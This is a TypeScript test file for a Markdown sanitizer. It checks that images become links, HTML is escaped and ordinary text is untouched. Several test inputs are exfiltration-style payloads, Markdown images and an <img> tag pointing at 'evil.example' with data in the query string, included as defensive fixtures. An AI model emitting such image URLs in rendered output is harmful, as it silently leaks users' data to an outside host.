import { describe, expect, test } from "bun:test";
import { sanitizeRichMarkdown } from "./sanitize.ts";

describe("sanitizeRichMarkdown", () => {
  test("images become links", () => {
    expect(
      sanitizeRichMarkdown("see ![logo](https://evil.example/?d=secret)"),
    ).toBe("see [logo](https://evil.example/?d=secret)");
    expect(
      sanitizeRichMarkdown("![a][ref]\n\n[ref]: https://evil.example"),
    ).toBe("[a][ref]\n\n[ref]: https://evil.example");
  });

  test("HTML tags, closing tags, comments and declarations become text", () => {
    expect(
      sanitizeRichMarkdown(
        '<img src="https://evil.example/?d=1"> <b>x</b> <!-- c --> <?php ?> <details>',
      ),
    ).toBe(
      '&lt;img src="https://evil.example/?d=1"> &lt;b>x&lt;/b> &lt;!-- c --> &lt;?php ?> &lt;details>',
    );
  });

  test("ordinary text and Markdown are untouched", () => {
    const text =
      "**Dana** moved to 4 < 5pm. 3 <= 4, a -> b.\n\n- one\n\n| a | b |\n| - | - |";
    expect(sanitizeRichMarkdown(text)).toBe(text);
  });
});
